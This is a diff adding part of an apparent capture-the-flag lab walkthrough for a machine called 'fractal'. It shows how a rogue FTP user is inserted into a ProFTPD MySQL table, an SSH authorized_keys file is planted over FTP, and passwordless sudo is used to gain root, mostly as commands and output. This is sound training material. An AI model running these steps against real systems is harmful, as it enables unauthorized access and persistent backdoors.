@@ -190,4 +190,126 @@ use proftpd;
 
 ```
 
-INSERT INTO ftpuser (userid,passwd,uid,gid,homedir,whell,count,accessed,modified) VALUES ()
+Since there is a user _benoit_ on the system, if we create an FTP user of _benoit_ we can authenticate to the FTP service and add authorized*keys to the */home/benoit/.ssh\_ directory.
+
+```bash
+INSERT INTO ftpuser (userid, passwd, uid, gid, homedir, shell, count, accessed, modified) VALUES ('benoit', '{md5}X03MO1qnZdYdgyfeuILPmQ==', '1000', '1000', '/', '/bin/bash', '0', '2022-09-27 05:26:29', '2022-09-27 05:26:29');
+Query OK, 1 row affected (0.01 sec)
+
+mysql> select * from ftpuser;
+select * from ftpuser;
++----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
+| id | userid | passwd                        | uid  | gid  | homedir       | shell         | count | accessed            | modified            |
++----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
+|  1 | www    | {md5}RDLDFEKYiwjDGYuwpgb7Cw== |   33 |   33 | /var/www/html | /sbin/nologin |     0 | 2022-09-27 05:26:29 | 2022-09-27 05:26:29 |
+|  2 | benoit | {md5}X03MO1qnZdYdgyfeuILPmQ== | 1000 | 1000 | /             | /bin/bash     |     0 | 2022-09-27 05:26:29 | 2022-09-27 05:26:29 |
++----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
+2 rows in set (0.00 sec)
+
+```
+
+Now we can authenticate to the FTP server and create/upload authorized_keys.
+
+```bash
+┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/fractal]
+└─$ ftp 192.168.152.233
+Connected to 192.168.152.233.
+220 ProFTPD Server (Debian) [192.168.152.233]
+Name (192.168.152.233:vagrant): benoit
+331 Password required for benoit
+Password:
+230 User benoit logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+
+# Create /home/benoit/.ssh directory
+ftp> passive
+passive
+Passive mode on.
+ftp> cd /home/benoit
+cd /home/benoit
+250 CWD command successful
+ftp> mkdir .ssh
+mkdir .ssh
+257 "/home/benoit/.ssh" - Directory successfully created
+
+# Copy generated RSA public key to an authorized_keys directory
+┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/fractal]
+└─$ sudo cp /home/vagrant/.ssh/id_rsa.pub authorized_keys
+
+# PUT the authorized_keys directory onto the FTP server
+ftp> cd /home/benoit/.ssh
+250 CWD command successful
+ftp> put authorized_keys
+local: authorized_keys remote: authorized_keys
+229 Entering Extended Passive Mode (|||33388|)
+150 Opening BINARY mode data connection for authorized_keys
+100% |***********************************************************|   566       10.58 MiB/s    00:00 ETA
+226 Transfer complete
+566 bytes sent in 00:00 (9.39 KiB/s)
+
+
+```
+
+Now we can authenticate as _Benoit_
+
+```bash
+┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/fractal]
+└─$ ssh benoit@192.168.152.233 -i /home/vagrant/.ssh/id_rsa
+The authenticity of host '192.168.152.233 (192.168.152.233)' can't be established.
+ED25519 key fingerprint is SHA256:D9EwlP6OBofTctv3nJ2YrEmwQrTfB9lLe4l8CqvcVDI.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.152.233' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu 23 Nov 2023 06:10:28 AM UTC
+
+  System load:  0.0               Processes:               223
+  Usage of /:   60.2% of 9.74GB   Users logged in:         0
+  Memory usage: 63%               IPv4 address for ens160: 192.168.152.233
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+$ id
+uid=1000(benoit) gid=1000(benoit) groups=1000(benoit)
+
+```
+
+## Check Sudo Privileges for Benoit
+
+```bash
+$ sudo -l
+Matching Defaults entries for benoit on fractal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User benoit may run the following commands on fractal:
+    (ALL) NOPASSWD: ALL
+
+```
+
+We have full Sudo permissions and can just switch to the "root" user
+
+```bash
+$ sudo su
+root@fractal:/home/benoit# id
+uid=0(root) gid=0(root) groups=0(root)
+
+```
